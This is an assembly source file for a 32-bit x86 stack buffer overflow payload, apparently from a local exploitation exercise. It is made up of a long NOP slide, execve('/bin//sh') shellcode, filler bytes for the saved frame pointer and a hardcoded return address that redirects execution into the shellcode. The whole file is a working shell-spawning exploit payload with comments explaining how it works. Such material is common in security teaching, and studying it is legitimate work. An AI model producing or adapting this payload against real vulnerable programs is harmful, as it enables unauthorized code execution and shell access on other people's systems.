; nasm -f bin arg.asm
; the total size of this shell code should be:
; 128 + 4 + 4 = 136 bytes

BITS 32
; Our nop slide, so we only have to jump somwehere into the range.
; This is needed because when program is execute under GDB it has
; different env variables that are pushed to stack so we don't know
; exactly what the address of our shell code will be.
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

; our shell code, 24 bytes
xor eax,eax
push eax
push 0x68732f6e     ;n/sh
push 0x69622f2f     ;//bi
mov ebx,esp         ;pointer to our string
push eax
mov ecx, esp
mov edx, esp
mov al,11          ;sys_execve
int 0x80

; 4 bytes
db '1234'

; EPI 4 bytes
db '1234'

; This is the address that the return address will be overwritten with.
; It has to point to the beginning of the shell code.

dd 0xffffd77f
